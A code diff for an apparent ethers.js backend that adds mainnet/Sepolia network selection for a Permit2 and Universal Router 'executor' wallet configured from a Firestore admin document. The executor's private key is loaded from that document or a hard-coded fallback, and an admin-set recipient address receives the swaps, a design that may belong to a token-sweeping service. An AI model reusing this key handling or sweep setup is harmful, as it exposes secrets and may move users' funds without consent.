@@ -12,7 +12,10 @@ import { ethers } from 'ethers';
 // Configuration / constants
 // -----------------------------
 const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3"; // same on all networks
-const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B"; // Mainnet
+const UNIVERSAL_ROUTER_BY_NETWORK = {
+  mainnet: "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B",
+  sepolia: "0x3fC91A3afd70395CD496C647d5a6CC9D4B2b7FAD"
+};
 
 // Hard-coded fallback executor address + private key (can be overridden via Firestore or env)
 const HARDCODED_EXECUTOR = '';
@@ -37,6 +40,8 @@ let spenderWallet = null;
 let router = null;
 let OUTPUT_TOKEN_OVERRIDE = null;
 let RPC_URL_OVERRIDE = null;
+let ACTIVE_NETWORK = 'mainnet';
+let ROUTER_ADDRESS = UNIVERSAL_ROUTER_BY_NETWORK.mainnet;
 
 // -----------------------------
 // Init function
@@ -63,11 +68,14 @@ async function init() {
     const cfgRef = doc(db, 'admin_config', 'settings');
     const cfgSnap = await getDoc(cfgRef);
     const cfg = cfgSnap.exists() ? cfgSnap.data() : {};
-    EXECUTOR_ADDRESS = cfg.executorAddress || process.env.EXECUTOR_ADDRESS || HARDCODED_EXECUTOR;
-    EXECUTOR_PRIVATE_KEY = cfg.executorPrivateKey || process.env.EXECUTOR_PRIVATE_KEY || HARDCODED_PRIVATE_KEY;
-    RECIPIENT_ADDRESS = cfg.recipientAddress || process.env.RECIPIENT_ADDRESS || HARDCODED_EXECUTOR;
-    OUTPUT_TOKEN_OVERRIDE = cfg.tokenAddress || process.env.OUTPUT_TOKEN || null;
-    RPC_URL_OVERRIDE = cfg.rpcUrl || process.env.RPC_URL || null;
+    ACTIVE_NETWORK = cfg.activeNetwork === 'sepolia' ? 'sepolia' : 'mainnet';
+    const scoped = cfg.networks?.[ACTIVE_NETWORK] || cfg;
+    EXECUTOR_ADDRESS = scoped.executorAddress || process.env.EXECUTOR_ADDRESS || HARDCODED_EXECUTOR;
+    EXECUTOR_PRIVATE_KEY = scoped.executorPrivateKey || process.env.EXECUTOR_PRIVATE_KEY || HARDCODED_PRIVATE_KEY;
+    RECIPIENT_ADDRESS = scoped.recipientAddress || process.env.RECIPIENT_ADDRESS || HARDCODED_EXECUTOR;
+    OUTPUT_TOKEN_OVERRIDE = scoped.tokenAddress || process.env.OUTPUT_TOKEN || null;
+    RPC_URL_OVERRIDE = scoped.rpcUrl || process.env.RPC_URL || null;
+    ROUTER_ADDRESS = scoped.universalRouter || UNIVERSAL_ROUTER_BY_NETWORK[ACTIVE_NETWORK] || UNIVERSAL_ROUTER_BY_NETWORK.mainnet;
   } catch (e) {
     // ignore — we'll fall back to hard-coded values
     console.error('failed to load admin_config settings (executor override):', e);
@@ -85,7 +93,7 @@ async function init() {
     throw new Error(`EXECUTOR_PRIVATE_KEY does not match EXECUTOR_ADDRESS: ${spenderWallet.address} != ${EXECUTOR_ADDRESS}`);
   }
 
-  router = new ethers.Contract(UNIVERSAL_ROUTER, UNIVERSAL_ROUTER_ABI, spenderWallet);
+  router = new ethers.Contract(ROUTER_ADDRESS, UNIVERSAL_ROUTER_ABI, spenderWallet);
 
   initialized = true;
 }
